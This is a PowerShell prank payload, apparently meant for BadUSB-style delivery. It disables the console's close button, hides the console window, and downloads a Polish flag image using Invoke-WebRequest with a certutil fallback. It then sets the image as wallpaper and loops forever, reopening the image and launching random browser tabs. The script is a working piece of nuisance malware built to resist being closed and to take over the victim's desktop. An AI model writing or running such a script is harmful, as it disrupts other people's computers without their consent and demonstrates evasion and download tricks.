Function _Disable-X {
    #Calling user32.dll methods for Windows and Menus
    $MethodsCall = '
    [DllImport("user32.dll")] public static extern long GetSystemMenu(IntPtr hWnd, bool bRevert);
    [DllImport("user32.dll")] public static extern bool EnableMenuItem(long hMenuItem, long wIDEnableItem, long wEnable);
    [DllImport("user32.dll")] public static extern long SetWindowLongPtr(long hWnd, long nIndex, long dwNewLong);
    [DllImport("user32.dll")] public static extern bool EnableWindow(long hWnd, int bEnable);
    '

    $SC_CLOSE = 0xF060
    $MF_DISABLED = 0x00000002L


    #Create a new namespace for the Methods to be able to call them
    Add-Type -MemberDefinition $MethodsCall -name NativeMethods -namespace Win32

    $PSWindow = Get-Process -Pid $PID
    $hwnd = $PSWindow.MainWindowHandle

    #Get System menu of windows handled
    $hMenu = [Win32.NativeMethods]::GetSystemMenu($hwnd, 0)

    #Disable X Button
    [Win32.NativeMethods]::EnableMenuItem($hMenu, $SC_CLOSE, $MF_DISABLED) | Out-Null
}
try {
    _Disable-X
}
catch {
    Write-Host "Disable X failed"
}

function InvWR {
    param (
        [string]$url,
        [string]$path
    )
    if (Get-Command "Invoke-WebRequest" -errorAction SilentlyContinue)
    {
        Invoke-WebRequest $url -OutFile $path -UseBasicParsing -TimeoutSec 600 -Method GET -ContentType "application/zip" -Headers @{"Accept-Encoding"="gzip";"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"} -erroraction 'silentlycontinue'
    }
    Else {
        & certutil.exe -urlcache -f "$url" "$path"
    }
}

function Download-File {
  [CmdletBinding()]
  param(
    [Parameter(Mandatory=$true)]
    [string]$Url,

    [Parameter(Mandatory=$true)]
    [string]$Path
  )
  $ProgressPreference = 'SilentlyContinue'
  InvWR -url $Url -path $Path
}

$setwallpapersrc = @"
using System.Runtime.InteropServices;

public class Wallpaper
{
  public const int SetDesktopWallpaper = 20;
  public const int UpdateIniFile = 0x01;
  public const int SendWinIniChange = 0x02;
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
  public static void SetWallpaper(string path)
  {
    SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
  }
}
"@
Add-Type -TypeDefinition $setwallpapersrc

Write-Host @"
░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░
░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
"@

Start-Sleep -Seconds 2
# Hide PowerShell Console
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

Start-Sleep -Seconds 5

$dlPath = "$HOME\Downloads"

Download-File -Url "https://upload.wikimedia.org/wikipedia/commons/7/7d/National_Flag_of_Poland.png" -Path "$dlPath\polska.png"

$showPolska0 = {
  [Wallpaper]::SetWallpaper("$dlPath\polska.png")
  $shell = New-Object -ComObject "Shell.Application"
  $shell.minimizeall()
}
$showPolska = {
  start "$dlPath\polska.png"
}
$showPolska2 = {
  $urls = @(
    "https://chomikuj.pl/",
    "https://jeja.pl/",
    "https://www.google.com/search?q=polska",
    "https://www.google.com/search?q=poland",
    "https://www.google.com/search?q=polska",
    "https://www.google.com/search?q=1+usd+to+pln",
    "https://www.google.com/search?q=polska&tbm=isch",
    "https://www.google.com/search?q=poland&tbm=isch",
    "https://www.youtube.com/watch?v=8nd5n5KVOUo",
    "https://www.youtube.com/watch?v=9cX17CeYKt0",
    "https://www.youtube.com/watch?v=c8ILsOysIkk",
    "https://www.youtube.com/watch?v=mTx45S-dQmQ",
    "https://www.youtube.com/watch?v=mTx45S-dQmQ",
    "https://www.youtube.com/watch?v=mTx45S-dQmQ",
    "https://www.youtube.com/watch?v=AJsWz9SlpfA",
    "https://www.youtube.com/watch?v=AJsWz9SlpfA",
    "https://www.youtube.com/watch?v=AJsWz9SlpfA",
  )

  $randomIndex = Get-Random -Minimum 0 -Maximum $urls.Count
  $urlToOpen = $urls[$randomIndex]
  Start-Process $urlToOpen
}
while ($true) {
  Invoke-Command $showPolska0
  Invoke-Command $showPolska
  Invoke-Command $showPolska
  Invoke-Command $showPolska2
  Start-Sleep -Seconds 1
}
